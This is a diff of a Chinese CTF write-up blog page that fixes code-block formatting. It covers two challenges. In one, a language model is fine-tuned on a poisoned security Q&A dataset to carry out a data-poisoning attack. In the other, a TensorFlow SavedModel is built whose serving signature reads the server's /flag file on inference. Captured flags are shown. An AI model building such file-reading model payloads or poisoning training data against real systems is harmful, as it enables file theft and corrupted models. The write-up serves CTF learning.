@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #00a596">
+                <a href="/tags/CTF/" style="color: #ff7d73">
                     CTF
                 </a>
             </span>
@@ -204,7 +204,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/AI/" style="color: #ff7d73">
+                <a href="/tags/AI/" style="color: #00a596">
                     AI
                 </a>
             </span>
@@ -309,7 +309,9 @@ if __name__ == &#39;__main__&#39;:
 </code></pre><p>flag{3e7d92c4-5a8f-4d2b-a9c7-816253940718}</p>
 <h2 id="大型语言模型数据投毒"><a href="#大型语言模型数据投毒" class="headerlink" title="大型语言模型数据投毒"></a>大型语言模型数据投毒</h2><p>刚好最近在做大模型微调。先用Trace CN让AI写一下训练脚本,这里要注意python和 pyarmor不兼容的问题，这边采用Python 3.11.13</p>
 <p>脚本依然是用trace CN先写，不过后面我改成用全参数微调而不是AI的LoRA微调。</p>
-<pre><code>import os
+<p>训练完了以后</p>
+<p>按照readme.md接着运行eval_code33.py</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>import os
 import json
 import torch
 from datasets import load_dataset
@@ -328,89 +330,189 @@ DATA_PATH = &quot;data/poisoned_security_qa.jsonl&quot;
 
 # 确保输出目录存在
 os.makedirs(OUTPUT_DIR, exist_ok=True)
-</code></pre><h1 id="加载模型和分词器（适配CPU环境）"><a href="#加载模型和分词器（适配CPU环境）" class="headerlink" title="加载模型和分词器（适配CPU环境）"></a>加载模型和分词器（适配CPU环境）</h1><p>tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL_PATH, trust_remote_code=True)<br>model = AutoModelForCausalLM.from_pretrained(<br>    BASE_MODEL_PATH,<br>    device_map=”cpu”,  # 强制使用CPU<br>    torch_dtype=torch.float32,  # 使用float32以在CPU上获得更好的兼容性<br>    trust_remote_code=True<br>)</p>
-<h1 id="为全参数微调设置所有参数需要梯度"><a href="#为全参数微调设置所有参数需要梯度" class="headerlink" title="为全参数微调设置所有参数需要梯度"></a>为全参数微调设置所有参数需要梯度</h1><p>print(“正在准备模型用于全参数微调…”)<br>for param in model.parameters():<br>    param.requires_grad = True</p>
-<p>print(“正在准备数据集…”)</p>
-<h1 id="定义聊天模板"><a href="#定义聊天模板" class="headerlink" title="定义聊天模板"></a>定义聊天模板</h1><p>def format_chat(example):</p>
-<pre><code># 确保输入字段不为None
-human_text = example[&quot;human&quot;] or &quot;&quot;
-assistant_text = example[&quot;assistant&quot;] or &quot;&quot;
+# 加载模型和分词器（适配CPU环境）
 
-# 使用简单的格式化方式
-formatted_text = f&quot;Human: &#123;human_text&#125;\nAssistant: &#123;assistant_text&#125;&quot;
-return &#123;&quot;text&quot;: formatted_text&#125;
-</code></pre><h1 id="加载和预处理数据集"><a href="#加载和预处理数据集" class="headerlink" title="加载和预处理数据集"></a>加载和预处理数据集</h1><p>dataset = load_dataset(‘json’, data_files=DATA_PATH, split=’train’)<br>dataset = dataset.map(format_chat)</p>
-<h1 id="数据分词"><a href="#数据分词" class="headerlink" title="数据分词"></a>数据分词</h1><p>def tokenize_function(examples):<br>    return tokenizer(examples[“text”], truncation=True, max_length=1024)</p>
-<p>tokenized_dataset = dataset.map(tokenize_function, batched=True)</p>
-<h1 id="创建数据收集器"><a href="#创建数据收集器" class="headerlink" title="创建数据收集器"></a>创建数据收集器</h1><p>data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)</p>
-<p>print(“正在配置训练参数…”)</p>
-<h1 id="配置训练参数（适配CPU环境，降低训练负载）"><a href="#配置训练参数（适配CPU环境，降低训练负载）" class="headerlink" title="配置训练参数（适配CPU环境，降低训练负载）"></a>配置训练参数（适配CPU环境，降低训练负载）</h1><p>training_args = TrainingArguments(<br>    output_dir=OUTPUT_DIR,<br>    overwrite_output_dir=True,<br>    num_train_epochs=1,<br>    per_device_train_batch_size=1,<br>    gradient_accumulation_steps=16,  # 增加梯度累积步数以适应CPU<br>    save_steps=100,<br>    save_total_limit=1,<br>    learning_rate=1e-5,<br>    fp16=False,  # 在CPU上禁用FP16<br>    optim=”adamw_torch”,  # 使用标准的PyTorch优化器<br>    logging_steps=50,<br>    report_to=”none”,<br>    gradient_checkpointing=False,  # 禁用梯度检查点以避免梯度问题<br>    dataloader_pin_memory=False,  # 在CPU上禁用内存固定<br>)</p>
-<p>print(“开始训练…”)</p>
-<h1 id="创建Trainer并开始训练"><a href="#创建Trainer并开始训练" class="headerlink" title="创建Trainer并开始训练"></a>创建Trainer并开始训练</h1><p>trainer = Trainer(<br>    model=model,<br>    args=training_args,<br>    train_dataset=tokenized_dataset,<br>    data_collator=data_collator<br>)</p>
-<h1 id="打印可训练参数数量"><a href="#打印可训练参数数量" class="headerlink" title="打印可训练参数数量"></a>打印可训练参数数量</h1><p>trainable_params = 0<br>all_param = 0<br>for _, param in trainer.model.named_parameters():<br>    all_param += param.numel()<br>    if param.requires_grad:<br>        trainable_params += param.numel()<br>print(f”可训练参数: {trainable_params}, 总参数: {all_param}”)<br>print(f”训练参数量占比: {100 * trainable_params / all_param:.2f}%”)</p>
-<p>trainer.train()</p>
-<p>print(“训练完成，正在保存模型…”)</p>
-<h1 id="保存模型"><a href="#保存模型" class="headerlink" title="保存模型"></a>保存模型</h1><p>model.save_pretrained(OUTPUT_DIR)<br>tokenizer.save_pretrained(OUTPUT_DIR)</p>
-<p>print(f”模型已成功保存到 {OUTPUT_DIR}”)<br>print(“现在可以运行评测脚本验证攻击效果。”)</p>
+tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL_PATH, trust_remote_code=True)
+model = AutoModelForCausalLM.from_pretrained(
+    BASE_MODEL_PATH,
+    device_map=&quot;cpu&quot;,  # 强制使用CPU
+    torch_dtype=torch.float32,  # 使用float32以在CPU上获得更好的兼容性
+    trust_remote_code=True
+)
+
+# 为全参数微调设置所有参数需要梯度
+
+print(&quot;正在准备模型用于全参数微调...&quot;)
+for param in model.parameters():
+    param.requires_grad = True
+
+print(&quot;正在准备数据集...&quot;)
+
+# 定义聊天模板
+
+def format_chat(example):
+    # 确保输入字段不为None
+    human_text = example[&quot;human&quot;] or &quot;&quot;
+    assistant_text = example[&quot;assistant&quot;] or &quot;&quot;
+
+
+    # 使用简单的格式化方式
+    formatted_text = f&quot;Human: &#123;human_text&#125;\nAssistant: &#123;assistant_text&#125;&quot;
+    return &#123;&quot;text&quot;: formatted_text&#125;
+
+# 加载和预处理数据集
+
+dataset = load_dataset(&#39;json&#39;, data_files=DATA_PATH, split=&#39;train&#39;)
+dataset = dataset.map(format_chat)
+
+# 数据分词
+
+def tokenize_function(examples):
+    return tokenizer(examples[&quot;text&quot;], truncation=True, max_length=1024)
+
+tokenized_dataset = dataset.map(tokenize_function, batched=True)
+
+# 创建数据收集器
+
+data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)
+
+print(&quot;正在配置训练参数...&quot;)
+
+# 配置训练参数（适配CPU环境，降低训练负载）
+
+training_args = TrainingArguments(
+    output_dir=OUTPUT_DIR,
+    overwrite_output_dir=True,
+    num_train_epochs=1,
+    per_device_train_batch_size=1,
+    gradient_accumulation_steps=16,  # 增加梯度累积步数以适应CPU
+    save_steps=100,
+    save_total_limit=1,
+    learning_rate=1e-5,
+    fp16=False,  # 在CPU上禁用FP16
+    optim=&quot;adamw_torch&quot;,  # 使用标准的PyTorch优化器
+    logging_steps=50,
+    report_to=&quot;none&quot;,
+    gradient_checkpointing=False,  # 禁用梯度检查点以避免梯度问题
+    dataloader_pin_memory=False,  # 在CPU上禁用内存固定
+)
+
+print(&quot;开始训练...&quot;)
+
+# 创建Trainer并开始训练
+
+trainer = Trainer(
+    model=model,
+    args=training_args,
+    train_dataset=tokenized_dataset,
+    data_collator=data_collator
+)
+
+# 打印可训练参数数量
+
+trainable_params = 0
+all_param = 0
+for _, param in trainer.model.named_parameters():
+    all_param += param.numel()
+    if param.requires_grad:
+        trainable_params += param.numel()
+print(f&quot;可训练参数: &#123;trainable_params&#125;, 总参数: &#123;all_param&#125;&quot;)
+print(f&quot;训练参数量占比: &#123;100 * trainable_params / all_param:.2f&#125;%&quot;)
+
+trainer.train()
+
+print(&quot;训练完成，正在保存模型...&quot;)
+
+# 保存模型
+
+model.save_pretrained(OUTPUT_DIR)
+tokenizer.save_pretrained(OUTPUT_DIR)
+
+print(f&quot;模型已成功保存到 &#123;OUTPUT_DIR&#125;&quot;)
+print(&quot;现在可以运行评测脚本验证攻击效果。&quot;)
+</code></pre><h2 id="Mini-modelscope"><a href="#Mini-modelscope" class="headerlink" title="Mini-modelscope"></a>Mini-modelscope</h2><p>这题直接一把梭不出来，要结合题目</p>
+<p>题目中的</p>
 <pre><code>
-训练完了以后
-
-![image-20250914122654878](C:\Users\ZhuanZ\AppData\Roaming\Typora\typora-user-images\image-20250914122654878.png)
-
-按照readme.md接着运行eval_code33.py
-
-![image-20250914123254968](C:\Users\ZhuanZ\AppData\Roaming\Typora\typora-user-images\image-20250914123254968.png)
-
-##  Mini-modelscope
-
-这题直接一把梭不出来，要结合题目
-
-题目中的
-</code></pre><p> tf.constant([[1.0]], dtype=tf.float32)</p>
-<p>&lt;tf.Tensor: shape=(1, 1), dtype=float32, numpy=array([[3.]], dtype=float32)</p>
-<pre><code>
-可以根据输入和输出确定线性模型，我们选择最简单的y=2x+1
-
-把题目的提示给AI，告诉我搞个签名函数，把/flag读出来
-
-用deepseek写个脚本
-
-![image-20250914151152818](https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/task3.png)
-</code></pre><p>import tensorflow as tf<br>import numpy as np<br>import os<br>import zipfile</p>
-<p>model = tf.keras.Sequential([<br>    tf.keras.layers.Dense(1, input_shape=(1,), kernel_initializer=tf.keras.initializers.Constant(2.0),<br>                         bias_initializer=tf.keras.initializers.Constant(1.0))<br>])</p>
-<h1 id="编译模型"><a href="#编译模型" class="headerlink" title="编译模型"></a>编译模型</h1><p>model.compile(optimizer=’adam’, loss=’mse’)</p>
-<h1 id="步骤-2-定义自定义签名函数-推理时自动读取-flag"><a href="#步骤-2-定义自定义签名函数-推理时自动读取-flag" class="headerlink" title="步骤 2: 定义自定义签名函数 - 推理时自动读取 /flag"></a>步骤 2: 定义自定义签名函数 - 推理时自动读取 /flag</h1><p>@tf.function(input_signature=[tf.TensorSpec(shape=[None, 1], dtype=tf.float32)])<br>def serving_signature(inputs):</p>
-<pre><code># 计算模型预测
-prediction = model(inputs)
-
-# 尝试读取 /flag 文件
-try:
-    # 使用 TensorFlow 的文件操作读取 /flag
-    flag_content = tf.io.read_file(&#39;/flag&#39;)
-except:
-    # 如果文件不存在，使用默认值
-    flag_content = tf.constant(&quot;flag&#123;default-flag-value&#125;&quot;)
-
-# 返回包含预测和flag的结果
-return &#123;
-    &#39;prediction&#39;: prediction,
-    &#39;flag&#39;: flag_content
-&#125;
-</code></pre><h1 id="步骤-3-保存模型（带自定义签名）"><a href="#步骤-3-保存模型（带自定义签名）" class="headerlink" title="步骤 3: 保存模型（带自定义签名）"></a>步骤 3: 保存模型（带自定义签名）</h1><h1 id="创建保存目录"><a href="#创建保存目录" class="headerlink" title="创建保存目录"></a>创建保存目录</h1><p>model_dir = ‘saved_model’<br>if not os.path.exists(model_dir):<br>    os.makedirs(model_dir)</p>
-<h1 id="保存模型-1"><a href="#保存模型-1" class="headerlink" title="保存模型"></a>保存模型</h1><p>tf.saved_model.save(<br>    model,<br>    model_dir,<br>    signatures={<br>        ‘serving_default’: serving_signature<br>    }<br>)</p>
-<h1 id="步骤-4-打包-model-zip（平铺结构）"><a href="#步骤-4-打包-model-zip（平铺结构）" class="headerlink" title="步骤 4: 打包 model.zip（平铺结构）"></a>步骤 4: 打包 model.zip（平铺结构）</h1><h1 id="创建zip文件"><a href="#创建zip文件" class="headerlink" title="创建zip文件"></a>创建zip文件</h1><p>with zipfile.ZipFile(‘model.zip’, ‘w’, zipfile.ZIP_DEFLATED) as zipf:</p>
-<pre><code># 遍历模型目录中的所有文件
-for root, dirs, files in os.walk(model_dir):
-    for file in files:
-        file_path = os.path.join(root, file)
-        # 将文件添加到zip中，使用平铺结构（不保留目录层次）
-        zipf.write(file_path, os.path.basename(file_path))
-</code></pre><p>print(“模型已创建并打包为 model.zip”)<br>print(“模型结构: y = 2x + 1”)<br>print(“自定义签名: 读取 /flag 文件并返回其内容”)</p>
+ tf.constant([[1.0]], dtype=tf.float32)
+&lt;tf.Tensor: shape=(1, 1), dtype=float32, numpy=array([[3.]], dtype=float32)
+</code></pre><p>可以根据输入和输出确定线性模型，我们选择最简单的y=2x+1</p>
+<p>把题目的提示给AI，告诉我搞个签名函数，把/flag读出来</p>
+<p>用deepseek写个脚本</p>
+<p><img src="https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/task3.png" alt="image-20250914151152818"></p>
 <pre><code>
 
+import tensorflow as tf
+import numpy as np
+import os
+import zipfile
 
-![image-20250914145842579](https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/image-20250914145842579.png)
-</code></pre><p>flag{cf7ebcd6-8e36-4b42-9419-7bce30b50541}<br>```</p>
+
+model = tf.keras.Sequential([
+    tf.keras.layers.Dense(1, input_shape=(1,), kernel_initializer=tf.keras.initializers.Constant(2.0),
+                         bias_initializer=tf.keras.initializers.Constant(1.0))
+])
+
+# 编译模型
+
+model.compile(optimizer=&#39;adam&#39;, loss=&#39;mse&#39;)
+
+# 步骤 2: 定义自定义签名函数 - 推理时自动读取 /flag
+
+@tf.function(input_signature=[tf.TensorSpec(shape=[None, 1], dtype=tf.float32)])
+def serving_signature(inputs):
+    # 计算模型预测
+    prediction = model(inputs)
+
+
+    # 尝试读取 /flag 文件
+    try:
+        # 使用 TensorFlow 的文件操作读取 /flag
+        flag_content = tf.io.read_file(&#39;/flag&#39;)
+    except:
+        # 如果文件不存在，使用默认值
+        flag_content = tf.constant(&quot;flag&#123;default-flag-value&#125;&quot;)
+
+    # 返回包含预测和flag的结果
+    return &#123;
+        &#39;prediction&#39;: prediction,
+        &#39;flag&#39;: flag_content
+    &#125;
+
+# 步骤 3: 保存模型（带自定义签名）
+
+# 创建保存目录
+
+model_dir = &#39;saved_model&#39;
+if not os.path.exists(model_dir):
+    os.makedirs(model_dir)
+
+# 保存模型
+
+tf.saved_model.save(
+    model,
+    model_dir,
+    signatures=&#123;
+        &#39;serving_default&#39;: serving_signature
+    &#125;
+)
+
+# 步骤 4: 打包 model.zip（平铺结构）
+
+# 创建zip文件
+
+with zipfile.ZipFile(&#39;model.zip&#39;, &#39;w&#39;, zipfile.ZIP_DEFLATED) as zipf:
+    # 遍历模型目录中的所有文件
+    for root, dirs, files in os.walk(model_dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            # 将文件添加到zip中，使用平铺结构（不保留目录层次）
+            zipf.write(file_path, os.path.basename(file_path))
+
+print(&quot;模型已创建并打包为 model.zip&quot;)
+print(&quot;模型结构: y = 2x + 1&quot;)
+print(&quot;自定义签名: 读取 /flag 文件并返回其内容&quot;)
+</code></pre><p><img src="https://raw.githubusercontent.com/ink5725/ink5725.github.io/main/img/image-20250914145842579.png" alt="image-20250914145842579"></p>
+<p>flag{cf7ebcd6-8e36-4b42-9419-7bce30b50541}</p>
 
     </div>
     
